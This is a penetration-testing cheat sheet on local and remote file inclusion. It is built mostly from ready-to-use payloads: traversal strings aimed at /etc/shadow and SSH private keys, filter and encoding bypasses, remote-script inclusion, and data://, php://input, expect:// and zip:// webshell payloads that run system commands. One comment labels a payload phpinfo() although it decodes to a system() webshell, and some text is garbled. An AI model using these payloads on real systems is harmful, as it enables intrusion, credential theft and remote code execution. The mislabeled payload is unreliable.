# X - Local & Remote File Inclusion [LFI/RFI]

The File Inclusion vulnerability allows for the include of a file locally
present on the server or remotely hosted on a webserver, usually exploiting a
"dynamic file inclusion" mechanisms implemented in the target application.  

This issue is caused when an application builds a path to executable code using
an attacker-controlled variable in a way that allows the attacker to control
which file is executed at run time. The vulnerability occurs due to the use of
user-supplied input without proper validation.

A file include vulnerability is distinct from a generic Directory Traversal
Attack, in that directory traversal is a way of gaining unauthorized file
system access, and a file inclusion vulnerability subverts how an application
loads code for execution.

### File Inclusion vulnerability detection

In black box testing, look for scripts which take filenames as parameters,
such as the following examples:

```
http://vulnerable_host/preview.php?file=example.html
http://vulnerable_host/?op=home
```

Try to access freely accessible files, such as:

```
# Linux
/etc/passwd

# Windows
WINDOWS\System32\drivers\etc\hosts
```

### File access

###### Basic

Typical proof-of-concept for basic LFI would be:

```
# Linux
?file=../../../../../../../../../../etc/passwd

# Windows
?file=..\..\..\..\..\..\..\..\..\..\WINDOWS\System32\drivers\etc\hosts
```

###### Files of interest

The following Linux files can be of interest:

```
# System information
/etc/issue

# System users account information
/etc/passwd

# System users account hashed password
/etc/shadow

# System groups information
/etc/group

/home/<USERNAME>/.ssh/id_rsa
/root/.ssh/id_rsa
/home/<USERNAME>/.ssh/authorized_keys
/root/.ssh/authorized_keys
```

###### Null Byte

In some cases, the server will append an extension at the end of the requested
file, such as ".php‚Äù.

Such mechanisms can be bypassed using the line terminator char *null byte*:

```
# Linux
?file=../../../../../../../../../../etc/passwd%00

# Windows
?file=..\..\..\..\..\..\..\..\..\..\WINDOWS\System32\drivers\etc\hosts%00
```

###### Double encoding

Encoding parameters twice in hexadecimal format can be leveraged to bypass
security controls such as blacklist filters.  
For example, the '.' (*dot*) character represent %2E in hexadecimal
representation. When the % symbol is encoded again, its representation in
hexadecimal code is %25. The result from the double encoding process is %252E.

```
# Linux
?file=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd

# Windows
?file=%252e%252e%255c%252e%252e%255c%252e%252e%255cWINDOWS%255cSystem32%255cdrivers%255cetc%255chosts
```

###### Filter bypass

Some blacklist filter may be implemented and restrict the usage of "../".  
Those kind of filter may be passed using the following payloads:

```
# Linux
?file=..././..././..././etc/passwd
?file=....//....//etc/passwd
?file=..///////..////..//////etc/passwd

# Windows
?file=....\\....\\....\\....\\....\\....\\WINDOWS\System32\drivers\etc\hosts%00
?file=..\\\\\\..\\\\\\..\\\\\\..\\\\\\..\\\\\\WINDOWS\System32\drivers\etc\hosts%00
```

###### PHP wrappers

**php://filter**  
This PHP wrapper can be used to access the source code of the page:

```
# Base64 encoding
?page=php://filter/convert.base64-encode/resource=config.php
?page=php://filter/convert.base64-encode/resource=config.php%00

# rot13 encoding
?page=php://filter/read=string.rot13/resource=config.php
?page=php://filter/read=string.rot13/resource=config.php%00
```

### Remote Code Execution

###### Basic remote file inclusion

If a File Inclusion vulnerability can be used to include remote files, the
vulnerability could be leveraged to make the web application retrieve and
execute a remote script.

The included script must be in a language supported by the web application.
Refer to the `[General] Shell` note for web and reverse shell payloads.

```
?file=<URL_TO_SCRIPT>
```

###### File upload

If the web application exposes an upload functionality, the uploaded files
could be leveraged through a local file inclusion to execute code on the target.

If no filter restrict the uploaded files type, the uploaded files should be in a
language supported by the web application to achieve code execution.
Refer to the `[General] Shell` note for web and reverse shell payloads.

Multiples filters can however limit the files type accepted by the web
application
  - client-side restrictions using `JavaScript`, etc.
  - HTTP `Content-Type` verification   
  - file extension black or white listing

Knowledge of the uploaded files path could be needed in order to include the
files through the local file inclusion vulnerability if the upload directory is
different from the file inclusion vulnerability working directory. The upload
directory path may be leaked by the web application, usually in error messages
or in settings / configuration web pages.

Refer to the `[WebApps] File upload` note for more information on how to bypass
upload filters and retrieve the uploaded file path.

###### PHP wrappers

**data**  
The PHP *data://* wrapper allows for the injection and execution of PHP code
given in parameter:

```
# <?php phpinfo(); ?>
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8%2B

# <?php system($_GET['cmd']); ?>
?page=data://text/plain;base64,PD8gcGhwIHN5c3RlbSgkX0dFVFsnY21kJ10pOyA%2fPg%3d%3d

# XSS (alert(1))
?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+
```

**expect**  
The PHP *expect://* wrapper allows execution of system commands but is not
enabled by default.

```
php?page=expect://whoami
```

**input**  
The PHP *input://* wrapper allows for the injection and execution of PHP code
given in the POST request body:

```
POST .../?page=php://input&cmd=whoami
...
<?php system($_GET['cmd']); ?>
```

**zip / phar**  
The *zip://* and *phar://* wrappers can be used to achive code execution if a
zip or phar archive can be upload to the server:

```
# <pre><?php system($_GET['cmd']); ?></pre>
echo "<pre><?php system(\$_GET['cmd']); ?></pre>" > payload.php;  
zip payload.zip payload.php;   
# As the file extension does not matter, a file with a jpg extension can be uploaded
mv payload.zip shell.jpg;    

# zip://<PATH_TO_UPLOADED_FILE>%23<FILE_INSIDE_ZIP>&cmd=<CMD>
?page=zip://shell.jpg%23payload&cmd=whoami
?page=zip://shell.jpg%23payload.php
```
